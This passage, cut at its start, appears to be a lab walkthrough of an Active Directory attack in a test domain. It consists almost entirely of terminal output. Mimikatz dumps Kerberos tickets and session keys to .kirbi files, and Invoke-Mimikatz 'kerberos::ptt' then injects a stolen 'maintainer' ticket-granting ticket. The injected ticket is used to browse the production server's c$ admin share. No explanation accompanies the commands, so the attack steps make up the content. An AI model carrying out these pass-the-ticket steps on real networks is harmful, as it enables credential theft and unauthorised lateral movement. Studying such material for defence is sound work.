           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             2049991e2b57789275b29184ee865590c2bdd7307d4de9b5e42cfb39675bd53d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 1        [...]
           * Saved to file [0;3e7]-0-0-40a50000.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/1/2024 1:33:22 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Target Name  (02) : LDAP ; prod.research.SECURITY.local ; research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL

           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL ( RESEARCH.SECURITY.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             8cbb9aeccf7de01e77d76bbc8eb20c7b6a3e5996b8d81238623765f44a4581b5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e7]-0-1-40a50000-SECLOGS$@LDAP-prod.research.SECURITY.local.kirbi !
         [00000002]
           Start/End/MaxRenew: 11/1/2024 1:33:22 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : LDAP ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (02) : LDAP ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             86f984b2954bd5280cc3e27e032e8bf2e4e6f48d1b460d15f31e2eb9495eb9cb
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e7]-0-2-40a50000-SECLOGS$@LDAP-prod.research.SECURITY.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/1/2024 1:33:22 PM ; 11/1/2024 11:33:22 PM ; 11/8/2024 1:33:22 PM
           Service Name (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Target Name  (02) : krbtgt ; RESEARCH.SECURITY.LOCAL ; @ RESEARCH.SECURITY.LOCAL
           Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL ( RESEARCH.SECURITY.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             09fc7af6f47adf49ad62a4cb201dfcc4dd3b22e3a30ad7a9dcf26644b9329255
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-40e10000-SECLOGS$@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi !

[seclogs.research.security.local]: PS C:\>
```

```
[seclogs.research.security.local]: PS C:\> ls | select name

Name
----
PerfLogs
Program Files
Program Files (x86)
Users
Windows
[0;154926]-0-0-60a50000-student@LDAP-prod.research.SECURITY.local.kirbi
[0;154926]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;179edb]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;17c659]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;2957a]-0-0-40a50000-maintainer@LDAP-prod.research.SECURITY.local.kirbi
[0;2957a]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;295a8]-0-0-40a50000-maintainer@ldap-prod.research.SECURITY.local.kirbi
[0;295a8]-0-1-40a50000-maintainer@LDAP-prod.research.SECURITY.local.kirbi
[0;295a8]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;36307e]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;363154]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;3e4]-0-0-40a50000-SECLOGS$@cifs-prod.research.SECURITY.local.kirbi
[0;3e4]-0-1-40a50000-SECLOGS$@GC-dc2012.SECURITY.local.kirbi
[0;3e4]-0-2-40a50000-SECLOGS$@ldap-prod.research.security.local.kirbi
[0;3e4]-2-0-60a10000-SECLOGS$@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;3e4]-2-1-40a50000-SECLOGS$@krbtgt-SECURITY.LOCAL.kirbi
[0;3e4]-2-2-40e10000-SECLOGS$@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;3e7]-0-0-40a50000.kirbi
[0;3e7]-0-1-40a50000-SECLOGS$@LDAP-prod.research.SECURITY.local.kirbi
[0;3e7]-0-2-40a50000-SECLOGS$@LDAP-prod.research.SECURITY.local.kirbi
[0;3e7]-2-0-40e10000-SECLOGS$@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
```

[seclogs.research.security.local]: PS C:\>


```
[seclogs.research.security.local]: PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt [0;2957a]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"'
Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::ptt [0;2957a]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi

* File: '[0;2957a]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi': OK

[seclogs.research.security.local]: PS C:\> whoami
research\student
[seclogs.research.security.local]: PS C:\>

[seclogs.research.security.local]: PS C:\> klist

Current LogonId is 0:0x154926

Cached Tickets: (1)

#0>     Client: maintainer @ RESEARCH.SECURITY.LOCAL
        Server: krbtgt/RESEARCH.SECURITY.LOCAL @ RESEARCH.SECURITY.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 11/1/2024 13:33:39 (local)
        End Time:   11/1/2024 23:33:39 (local)
        Renew Time: 11/8/2024 13:33:39 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
[seclogs.research.security.local]: PS C:\>

[seclogs.research.security.local]: PS C:\> ls \\prod.research.SECURITY.local\c$


    Directory: \\prod.research.SECURITY.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/22/2013   3:52 PM                PerfLogs
d-r---        10/1/2021   4:25 PM                Program Files
d-----        9/21/2021  12:28 PM                Program Files (x86)
d-r---        9/27/2021   9:00 AM                Users
d-----        9/27/2021   9:19 AM                Windows


[seclogs.research.security.local]: PS C:\>
```
